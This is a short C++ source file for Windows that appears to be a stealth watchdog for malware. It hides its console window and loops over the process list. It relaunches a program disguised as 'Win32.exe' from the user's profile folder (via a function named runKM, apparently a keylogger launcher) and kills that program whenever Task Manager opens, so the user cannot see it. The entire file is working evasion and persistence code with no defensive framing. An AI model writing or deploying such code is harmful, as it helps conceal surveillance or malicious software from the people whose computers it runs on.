#include <iostream>
#include <vector>
#include <windows.h>
#include <sstream>




using namespace std;



void runKM();
std::string exec(const char *cmd);
int findPs(vector<string> processes, string ps);
vector<string> splitStr(string s);







int main(){

    HWND stealth;
    AllocConsole();
    stealth = FindWindow("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);

    
    while(1){
        vector<string> processes = splitStr(exec("TASKLIST"));
        if (findPs(processes, "Taskmgr.exe") && findPs(processes, "Win32.exe")){
            system("TASKKILL /F /IM Win32.exe");
            system("TASKKILL /F /IM system32.exe");
        }
        else if (!findPs(processes, "Win32.exe") && !findPs(processes, "Taskmgr.exe")){
            HANDLE thrd;
    	    DWORD threadID;
    	    thrd = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)runKM, NULL, 0, &threadID);
            Sleep(1);
        }
    }
    return 0;
}






void runKM(){
    system("\"\%userprofile\%\\application data\\WIN32\\Win32.exe\"");
}





int findPs(vector<string> processes, string ps){
    int procs = processes.size();
    for (int i=0; i<procs; i++){
        if (processes[i] == ps){
            return 1;
        }
    }
    return 0;
}



vector<string> splitStr(string s){
    vector<string> strs = {};
    stringstream ss(s);
    string word;
    while (ss >> word){
        strs.push_back(word);
    }
    return strs;
}












std::string exec(const char* cmd) {
    char buffer[128];
    std::string result = "";
    FILE* pipe = _popen(cmd, "r");
    if (!pipe) throw std::runtime_error("popen() failed!");
    try {
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            result += buffer;
        }
    } catch (...) {
        _pclose(pipe);
        throw;
    }
    _pclose(pipe);
    return result;
}

